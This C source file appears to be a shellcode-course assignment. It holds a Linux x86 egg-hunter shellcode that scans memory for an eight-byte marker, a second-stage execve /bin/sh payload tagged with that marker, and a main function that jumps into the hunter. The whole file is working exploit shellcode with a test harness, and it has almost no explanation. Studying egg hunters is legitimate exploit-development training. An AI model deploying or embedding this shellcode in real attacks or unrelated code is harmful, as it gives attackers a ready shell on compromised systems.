#include<stdio.h>
#include<string.h>

#define EGG "\x90\x50\x90\x50"

char egg[] = EGG;

unsigned char egg_hunter[] = \
"\x31\xdb\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

//Any payload can be placed after the eight byte Egg. This fulfills the third criteria of the assignment.
unsigned char second_stage[] = \
                                EGG
                                EGG
                                "\x31\xc0\x50\x68\x6e\x2f\x73\x68"
                                "\x68\x2f\x2f\x62\x69\x89\xe3\x50"
                                "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"; // /bin/sh execve-stack

main()
{
  printf("[+] Egg Hunter Length: %d\n", strlen(egg_hunter));
  printf("[+] Shellcode Length: %d\n", strlen(second_stage));
  int (*ret)() = (int(*)())egg_hunter;
  ret();
}
